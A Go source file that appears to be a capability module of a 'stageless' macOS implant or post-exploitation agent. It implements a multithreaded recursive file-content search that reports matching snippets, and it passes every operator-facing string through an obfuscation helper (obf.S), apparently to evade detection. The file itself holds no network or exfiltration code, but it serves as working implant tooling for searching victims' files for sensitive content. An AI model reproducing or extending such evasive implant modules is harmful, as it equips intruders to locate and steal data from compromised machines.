package capabilities

import (
	"encoding/json"
	"fmt"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"

	"stageless/utils/macapi"
	"stageless/utils/obf"
)

const (
	searchDefaultThreads     = 4
	searchMaxThreads         = 32
	searchDefaultSizeLimitMb = 200
	searchMaxFiles           = 50000
	searchContextRadius      = 500
)

type searchHit struct {
	idx     int
	path    string
	snippet string
}

type searchCtx struct {
	mu             sync.Mutex
	files          []string
	nextIdx        int
	hits           []searchHit
	needle         string
	needleLower    string
	sizeLimitBytes int
	caseSensitive  bool
}

func searchParamStr(params string, key string) string {
	// Reads a string parameter from the request
	if params == "" {
		return ""
	}
	var p map[string]any
	if err := json.Unmarshal([]byte(params), &p); err != nil {
		return ""
	}
	v, ok := p[key]
	if !ok {
		return ""
	}
	switch t := v.(type) {
	case string:
		return strings.TrimSpace(t)
	default:
		return strings.TrimSpace(fmt.Sprint(v))
	}
}

func searchParamBool(params string, key string) bool {
	// Reads a boolean parameter from the request
	if params == "" {
		return false
	}
	var p map[string]any
	if err := json.Unmarshal([]byte(params), &p); err != nil {
		return false
	}
	v, ok := p[key]
	if !ok {
		return false
	}
	switch t := v.(type) {
	case bool:
		return t
	case string:
		s := strings.ToLower(strings.TrimSpace(t))
		return s == "1" || s == "true" || s == "yes" || s == "on"
	default:
		return false
	}
}

func searchParamInt(params string, key string, defaultVal int) int {
	// Reads an integer parameter from the request
	if params == "" {
		return defaultVal
	}
	var p map[string]any
	if err := json.Unmarshal([]byte(params), &p); err != nil {
		return defaultVal
	}
	v, ok := p[key]
	if !ok {
		return defaultVal
	}
	switch t := v.(type) {
	case float64:
		return int(t)
	case int:
		return t
	case string:
		n, err := strconv.Atoi(strings.TrimSpace(t))
		if err != nil {
			return defaultVal
		}
		return n
	default:
		return defaultVal
	}
}

func searchNormPath(p string) string {
	// Only sanitizes a search path
	s := strings.TrimSpace(strings.ReplaceAll(p, "\\", macapi.PathSep))
	return strings.TrimRight(s, macapi.PathSep)
}

func searchReadText(path string, maxBytes int) string {
	// Reads file text up to a size limit
	st, err := os.Stat(path)
	if err != nil || st.IsDir() || st.Size() <= 0 || st.Size() > int64(maxBytes) {
		return ""
	}
	ok, data, _ := macapi.ReadFileBytes(path)
	if !ok || len(data) == 0 {
		return ""
	}
	probe := len(data)
	if probe > 8192 {
		probe = 8192
	}
	nulls := 0
	for i := 0; i < probe; i++ {
		if data[i] == 0 {
			nulls++
		}
	}
	if nulls > 2 {
		return ""
	}
	return string(data)
}

func searchMatchSnippet(raw, needle, needleLower string, caseSensitive bool) string {
	// Finds a matching snippet around the search term
	if raw == "" || needle == "" {
		return ""
	}
	var pos int
	if caseSensitive {
		pos = strings.Index(raw, needle)
	} else {
		pos = strings.Index(strings.ToLower(raw), needleLower)
	}
	if pos < 0 {
		return ""
	}
	lineStart := pos
	for lineStart > 0 && raw[lineStart-1] != '\n' && raw[lineStart-1] != '\r' {
		lineStart--
	}
	lineEnd := pos
	for lineEnd < len(raw) && raw[lineEnd] != '\n' && raw[lineEnd] != '\r' {
		lineEnd++
	}
	line := raw[lineStart:lineEnd]
	matchInLine := pos - lineStart
	snipStart := matchInLine - searchContextRadius
	if snipStart < 0 {
		snipStart = 0
	}
	snipEnd := matchInLine + len(needle) + searchContextRadius
	if snipEnd > len(line) {
		snipEnd = len(line)
	}
	return line[snipStart:snipEnd]
}

func searchCollectFiles(root string, recursive bool, files *[]string) {
	// Collects files under a root path
	if len(*files) >= searchMaxFiles {
		return
	}
	if !macapi.PathIsDir(root) {
		if macapi.PathExists(root) {
			*files = append(*files, root)
		}
		return
	}
	for _, ent := range macapi.ListDirEntries(root) {
		full := macapi.JoinPath(root, ent.Name)
		if ent.IsDir {
			if recursive {
				searchCollectFiles(full, recursive, files)
			}
		} else if len(*files) < searchMaxFiles {
			*files = append(*files, full)
		}
	}
}

func searchWorker(ctx *searchCtx) {
	// Searches assigned files for matches
	for {
		ctx.mu.Lock()
		if ctx.nextIdx >= len(ctx.files) {
			ctx.mu.Unlock()
			return
		}
		idx := ctx.nextIdx
		ctx.nextIdx++
		path := ctx.files[idx]
		ctx.mu.Unlock()

		raw := searchReadText(path, ctx.sizeLimitBytes)
		snippet := searchMatchSnippet(raw, ctx.needle, ctx.needleLower, ctx.caseSensitive)
		if snippet == "" {
			continue
		}
		ctx.mu.Lock()
		ctx.hits = append(ctx.hits, searchHit{idx: idx, path: path, snippet: snippet})
		ctx.mu.Unlock()
	}
}

func RunSearch(args, input, params string) []byte {
	// Main function that orchestrates a content search
	root := searchNormPath(searchParamStr(params, obf.S("path")))
	if root == "" {
		root = searchNormPath(strings.TrimSpace(args))
	}
	needle := searchParamStr(params, obf.S("content"))
	if needle == "" {
		return WriteMsg(obf.S("Error: missing search term (use --content)"))
	}
	if root == "" {
		return WriteMsg(obf.S("Error: missing path (use --path)"))
	}

	recursive := searchParamBool(params, obf.S("recursive"))
	caseSensitive := searchParamBool(params, obf.S("case_sensitive"))
	sizeMb := searchParamInt(params, obf.S("size_limit"), searchDefaultSizeLimitMb)
	if sizeMb < 1 {
		sizeMb = 1
	}
	sizeLimitBytes := sizeMb * 1024 * 1024
	workers := searchParamInt(params, obf.S("thread"), searchDefaultThreads)
	if workers < 1 {
		workers = 1
	} else if workers > searchMaxThreads {
		workers = searchMaxThreads
	}

	ctx := &searchCtx{
		needle:         needle,
		needleLower:    strings.ToLower(needle),
		sizeLimitBytes: sizeLimitBytes,
		caseSensitive:  caseSensitive,
	}
	searchCollectFiles(root, recursive, &ctx.files)
	if len(ctx.files) == 0 {
		return WriteMsg(obf.S("No files to search"))
	}

	if workers == 1 {
		searchWorker(ctx)
	} else {
		var wg sync.WaitGroup
		wg.Add(workers)
		for i := 0; i < workers; i++ {
			go func() {
				// Runs one search worker and marks it done
				searchWorker(ctx)
				wg.Done()
			}()
		}
		wg.Wait()
	}

	sort.Slice(ctx.hits, func(i, j int) bool {
		// Compares hit indexes for sorting
		return ctx.hits[i].idx < ctx.hits[j].idx
	})

	var report strings.Builder
	for _, h := range ctx.hits {
		report.WriteString(obf.S("[*] FOUND: "))
		report.WriteString(h.path)
		report.WriteString("\n\n")
		report.WriteString(obf.S("Content: "))
		report.WriteString("\"")
		report.WriteString(h.snippet)
		report.WriteString("\"\n\n")
	}
	if report.Len() == 0 {
		return WriteMsg(obf.S("No matches"))
	}
	return WriteMsg(report.String())
}
